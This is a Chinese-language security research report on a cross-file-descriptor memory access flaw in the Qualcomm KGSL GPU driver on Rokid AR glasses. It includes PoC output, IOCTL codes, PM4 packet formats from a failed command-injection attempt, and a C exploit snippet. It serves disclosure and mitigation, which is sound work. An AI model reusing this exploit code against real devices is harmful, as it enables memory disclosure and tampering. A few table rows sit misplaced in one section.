# KGSL GPU Driver Vulnerability Research - Final Report

> English: [KGSL_FINAL_REPORT_EN.md](KGSL_FINAL_REPORT_EN.md)

> 📌 **事實依據**：本檔涉及裝置世代、kernel config、CVE 狀態、GhostLock 位移與產品結構等事實時，一律以 [`reports/FACTS.md`](FACTS.md) 為準（單一權威事實表；衝突時以該表裁決）。


## 執行摘要

在 Rokid AR Glasses 上發現了一個 **嚴重的跨 FD GPU 記憶體訪問漏洞**。此漏洞允許同一進程內的不同 file descriptor 訪問彼此的 GPU 記憶體，違反了 fd 隔離原則。

### 漏洞嚴重性評估

| 漏洞                    | 嚴重性       | CVSS 估計 | 狀態      |
| ----------------------- | ------------ | --------- | --------- |
| 跨 FD GPU 記憶體訪問    | **Critical** | 7.8       | ✅ 已確認 |
| Double mmap 物理頁共享  | Medium       | 5.5       | ✅ 已確認 |
| fd 關閉後記憶體仍可訪問 | Low          | 4.0       | ✅ 已確認 |

---

## 設備信息

| 項目            | 值                              |
| --------------- | ------------------------------- |
| 設備            | Rokid AR Glasses                |
| Kernel          | 5.10.209-perf                   |
| Android         | 12                              |
| GPU             | Adreno 621v1                    |
| SoC ID          | 579 (Qualcomm neo)              |
| Security Patch  | 2024-07-05                      |
| KGSL Driver     | /vendor/lib/modules/msm_kgsl.ko |
| GPU Reset Count | 34                              |

---

## 漏洞詳情

### 🔴 漏洞 #1: 跨 FD GPU 記憶體訪問 (Critical)

#### 描述

KGSL 驅動程式在同一進程內的所有 file descriptor 之間共享 GPU 記憶體頁表。這意味著透過一個 fd 分配的 GPU 記憶體可以被同一進程的另一個 fd 透過特定的 mmap offset 訪問。

#### 技術細節

**mmap offset 到 GPU 頁面的映射關係:**

```
offset = (page_index + 1) * 0x1000

範例:
offset 0x1000 → 第 0 頁 → gpuaddr 0x4000000000
offset 0x2000 → 第 1 頁 → gpuaddr 0x4000001000
offset 0x3000 → 第 2 頁 → gpuaddr 0x4000002000
...
```

**漏洞觸發條件:**

1. 進程必須打開多個 `/dev/kgsl-3d0` file descriptor
2. 至少一個 fd 必須分配 GPU 記憶體
3. 另一個 fd 可以透過計算 offset 訪問該記憶體

#### PoC 證明

```
=== Cross-FD Memory Access Test ===
[+] fd1 allocated: gpuaddr=0x4000000000
[+] fd1 wrote secret: 0xaabbccdd11223344
[*] Trying fd2 mmap with offset=0x1000 (page_index=0)
[+] fd2 read: 0xaabbccdd11223344
[!!!] CRITICAL: Cross-FD memory access succeeded!
[!!!] fd2 can read fd1's GPU memory!
[*] fd1 reads after fd2 write: 0xfeedfacecafebabe
[!!!] CONFIRMED: Cross-FD write access!
```

#### 利用場景

1. **沙箱逃逸**: 如果應用程式使用不同 fd 來隔離不同安全域的 GPU 操作
2. **資訊洩露**: 讀取其他 fd 分配的敏感 GPU 資料 (如機器學習權重、加密緩衝區)
3. **記憶體損壞**: 修改其他 fd 的 GPU 資料，可能導致任意程式碼執行

---

### 🟡 漏洞 #2: Double mmap 物理頁共享

#### 描述

對同一 GPU 地址進行多次 mmap 會映射到相同的物理頁面，創建多個虛擬地址指向同一物理記憶體。

#### PoC 證明

```
[+] Allocated: gpuaddr=0x400027c000
[+] First mmap: ptr1=0x7460a35000
[+] Second mmap: ptr2=0x7460a34000
[*] ptr1 wrote 0xDEADBEEF, ptr2 reads: 0xdeadbeef
[+] Same physical page! Two mappings to same memory.
[*] ptr2 wrote 0xCAFEBABE, ptr1 reads: 0xcafebabe
```

#### 利用場景

- Race condition 攻擊
- TOCTOU (Time-of-check-time-of-use) 攻擊
- Confused deputy 攻擊

---

### 🟢 漏洞 #3: fd 關閉後記憶體仍可訪問

#### 描述

關閉分配 GPU 記憶體的 fd 後，已建立的 mmap 映射仍然有效。

#### 測試結果

```
[+] Allocated: gpuaddr=0x4000000000
[*] Created 100 mappings
[*] Closed fd, checking mappings...
[*] Valid mappings after fd close: 100/100
```

---

## 工作的 IOCTL

| IOCTL Code | 功能                                      | 返回值                 |
| ---------- | ----------------------------------------- | ---------------------- |
| 0xc018092f | GPUMEM_ALLOC                              | ✅ 成功                |
| 0xc0040938 | GPU Info 1 (Version 0x41a)                | ✅ 成功                |
| 0xc0040939 | GPU Info 2 (Version 0x41b)                | ✅ 成功                |
| 0xc004093a | GPU Info 3                                | ✅ 成功                |
| 0xc0040940 | Resource Alloc (returns incrementing IDs) | ✅ 成功                |
| 0xc0040956 | SYNCSOURCE_CREATE_FENCE                   | ✅ 成功                |
| 0xc0200958 | GPU_AUX_COMMAND                           | ✅ 成功                |
| 0xc0300948 | Wait Operation                            | 返回 **ENOTSUPP (524)**（**ERESTARTSYS 是 512；2026-09-13 更正**） |

---

## 失敗的攻擊向量

| 向量                      | 結果    | 原因                                  |
| ------------------------- | ------- | ------------------------------------- |
| 跨進程記憶體訪問          | ❌ 失敗 | GPU 頁表是進程隔離的                  |
| Context 創建              | ❌ 失敗 | "legacy context switch not supported" |
| **GPU Command Execution** | ❌ 失敗 | 見下方詳細分析 (2026-02-03) 🆕        |
| Perfcounter 訪問          | ❌ 失敗 | 結構格式未知                          |

---

### ❌ GPU Command Execution 失敗分析 (2026-02-03 更新) 🆕

#### 目標

通過 `IOCTL_KGSL_GPU_COMMAND` 提交 PM4 指令，讓 GPU 執行記憶體寫入 (`CP_MEM_WRITE`)，實現任意記憶體寫入原語。

#### 測試工具

`kgsl_cmd_inject.c` - GPU PM4 命令注入 PoC

#### 測試結果

| 測試項目                | 結果                | 說明                    |
| ----------------------- | ------------------- | ----------------------- |
| IOCTL_KGSL_GPU_COMMAND  | ✅ 返回成功 (ret=0) | IOCTL 被接受            |
| Context 創建 (GL type)  | ❌ EINVAL           | 所有 flag 組合都失敗    |
| context_id=0 提交       | ✅ 返回成功         | 但命令不執行            |
| Type 3 CP_MEM_WRITE     | ❌ 目標記憶體為 0   | 命令未被 GPU 處理       |
| Type 7 CP_MEM_WRITE     | ❌ 目標記憶體為 0   | 命令未被 GPU 處理       |
| GPU memcpy (MEM_TO_MEM) | ❌ 目標記憶體為 0   | 命令未被 GPU 處理       |
| Scratch register 操作   | ❌ 結果為 0         | 命令未被 GPU 處理       |
| 直接 CPU 寫入 (對照)    | ✅ 成功             | 驗證 GPU 記憶體映射正確 |

#### 根本原因

1. **Context 創建失敗**: dmesg 顯示 `kgsl kgsl-3d0: legacy context switch not supported`
   - 所有 context flag 組合 (GL, CL, ANY, PREAMBLE 等) 都返回 EINVAL
   - 無法獲得有效的 `context_id`

2. **GPU_COMMAND 接受無效 context**:
   - `context_id=0` 被 IOCTL 接受但不觸發 GPU 執行
   - 命令可能被排入隊列但從未實際調度到 GPU

3. **可能的保護機制**:
   - GPU 可能處於 "protected mode" 或 "secure execution" 狀態
   - 只有特權進程 (如 SurfaceFlinger) 才能真正執行 GPU 命令
   - 命令可能需要透過 HWC/Gralloc HAL 路徑提交

#### PM4 封包格式驗證

已測試兩種 CP_MEM_WRITE (0x3D) 封包格式:

**Type 3 格式** (傳統 Adreno):

```
Header: 0xC0033D00 = Type3 | (count-1)<<16 | opcode<<8
        = 0xC0000000 | 0x30000 | 0x3D00
```

**Type 7 格式** (Adreno 6xx):

```
Header: 0x703D0004 = Type7 | opcode<<16 | count
        = 0x70000000 | 0x3D0000 | 0x04
```

兩種格式都無法觸發實際的 GPU 記憶體寫入。

#### 結論

**GPU Arbitrary Write 攻擊向量不可行**：

- 此設備的 KGSL 驅動拒絕創建 GPU context
- 雖然 GPU_COMMAND IOCTL 返回成功，但命令不會被實際執行
- 這可能是 Qualcomm 的安全強化措施，限制非特權進程的 GPU DMA 能力
  | Free IOCTL (0x32) | ❌ 失敗 | 返回 ENODEV (19) |
  | Timeline 操作 | ❌ 失敗 | 返回 ENODEV (19) |

---

## PoC 代碼

### kgsl_cross_fd_exploit.c

完整 PoC 已保存在工作目錄中。核心邏輯:

```c
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <stdint.h>

#define IOCTL_GPUMEM_ALLOC 0xc018092f

int main() {
    // Open two file descriptors
    int fd1 = open("/dev/kgsl-3d0", O_RDWR);
    int fd2 = open("/dev/kgsl-3d0", O_RDWR);

    // Allocate on fd1
    struct {
        uint64_t gpuaddr;
        uint64_t size;
        uint32_t flags;
        uint32_t padding;
    } req = {0};
    req.size = 0x1000;
    ioctl(fd1, IOCTL_GPUMEM_ALLOC, &req);

    // Map and write secret on fd1
    void* ptr1 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                     MAP_SHARED, fd1, req.gpuaddr);
    *(uint64_t*)ptr1 = 0xAABBCCDD11223344;

    // fd2 needs allocation to enable mmap
    struct { ... } req2 = {0};
    req2.size = 0x1000;
    ioctl(fd2, IOCTL_GPUMEM_ALLOC, &req2);

    // Calculate offset: page_index + 1 * 0x1000
    uint64_t offset = 0x1000;  // First page

    // Access fd1's memory via fd2!
    void* ptr2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                     MAP_SHARED, fd2, offset);

    printf("fd2 reads fd1's secret: 0x%lx\n", *(uint64_t*)ptr2);
    // Output: fd2 reads fd1's secret: 0xaabbccdd11223344

    return 0;
}
```

---

## 緩解建議

1. **fd 隔離**: 每個 fd 應該有獨立的 GPU 記憶體命名空間
2. **offset 驗證**: mmap offset 應該只能訪問該 fd 分配的記憶體
3. **參考計數修復**: 考慮在 fd 關閉時無效化相關映射

---

## CVE 報告建議

**類型**: CWE-284: Improper Access Control  
**受影響組件**: Qualcomm KGSL Driver (msm_kgsl.ko)  
**受影響版本**: 需要進一步調查  
**建議報告給**: Qualcomm Product Security (QPSR)

---

## 創建的測試文件

| 檔案                        | 用途                 |
| --------------------------- | -------------------- |
| kgsl_cross_fd_exploit.c     | 跨 fd 記憶體訪問 PoC |
| kgsl_cross_process_attack.c | 跨進程測試           |
| kgsl_fd_confusion_exploit.c | fd 混淆漏洞利用      |
| kgsl_offset_exploit.c       | offset 映射分析      |
| kgsl_wait_exploit.c         | 等待操作研究         |
| kgsl_gpu_reset_exploit.c    | GPU 重置研究         |
| kgsl_final_exploit.c        | 綜合測試             |
| **kgsl_cmd_inject.c** 🆕    | GPU PM4 命令注入測試 |

---

## 總結

成功在 Rokid AR Glasses 的 KGSL GPU 驅動上發現並確認了一個跨 fd GPU 記憶體訪問漏洞。此漏洞允許同一進程的不同 fd 訪問彼此的 GPU 記憶體，這是一個嚴重的安全問題，可能被利用於沙箱逃逸或資訊洩露攻擊。

**2026-02-03 更新**: GPU Command Injection (PM4 DMA) 攻擊向量已測試並確認不可行，因為設備拒絕創建 GPU context，導致 GPU 命令無法實際執行。

該漏洞已通過多個 PoC 確認，建議報告給 Qualcomm 進行修復。
